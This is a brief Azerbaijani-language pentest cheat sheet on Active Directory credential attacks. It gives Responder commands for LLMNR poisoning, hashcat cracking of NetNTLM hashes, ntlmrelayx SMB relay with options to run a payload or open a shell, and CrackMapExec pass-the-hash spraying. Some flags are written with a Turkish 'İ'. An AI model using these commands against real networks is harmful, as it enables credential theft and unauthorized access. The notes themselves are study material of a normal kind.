LLMNR (Link-Local Multicast Name Resolution) Poisoning, şəbəkədə DNS sorğularını əvəz edən LLMNR protokolunun zəifliklərindən istifadə edərək, istifadəçi adları və şifrələri oğurlamağa yönəlmiş hücum növüdür. Bu hücumda hücumçu saxta cavablar göndərərək qurbanın autentifikasiya məlumatlarını öz cihazına yönləndirir.
responder -İ tun0 -rdwv
 username::DOMAIN:lmhash:ntlmhash:timestamp
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
5500 NetNTLMv1
5500 NetNTLMv1+ESS
5600 NetNTLMv2
1000 NTLM

SMB Relay, qurbanın göndərdiyi NTLM autentifikasiya məlumatlarını ələ keçirərək onları başqa bir serverə təqdim etməklə hücumçunun həmin serverə giriş əldə etməsini təmin edən bir hücum növüdür. Bu hücum əsasən SMB protokolunun zəifliklərindən istifadə edərək autentifikasiya mexanizmini aldatmağa yönəlir.
python3 responder.py -İ tun0 -rdwv
uid:rid:lmhash:nthash
impacket-ntlmrelayx -tf targets.txt -smb2support
-i interactive session yaradacaq, ip və portu özü verəcək, nc ilə bağlanacağıq
-e malware.exe  		-c "whoami"

CrackMapExec (CME), Active Directory mühitlərində və Windows şəbəkələrində zəifliklərin və yanlış konfiqurasiyaların test edilməsi üçün istifadə olunan çoxfunksiyalı bir pentest vasitəsidir. O, xüsusilə SMB, RDP, WinRM kimi protokollar vasitəsilə istifadəçi parol məlumatlarını yoxlamaq, lateral hərəkətləri təhlil etmək və məlumat toplamaq üçün faydalıdır.
crackmapexec protocol cidr -u username -d  domain -p password
crackmapexec protocol cidr -u username -d  domain -H hash --local-auth

LDAP Pass-back Attack, LDAP (Lightweight Directory Access Protocol) serverlərində autentifikasiya sorğularının zəncirvari yönləndirilməsi zamanı baş verən bir hücum növüdür. Bu hücumda hücumçu, qurbanın autentifikasiya sorğusunu manipulyasiya edərək onu öz nəzarətində olan bir serverə yönləndirir və beləliklə, istifadəçi adlarını, şifrələri və digər həssas məlumatları ələ keçirə bilir.
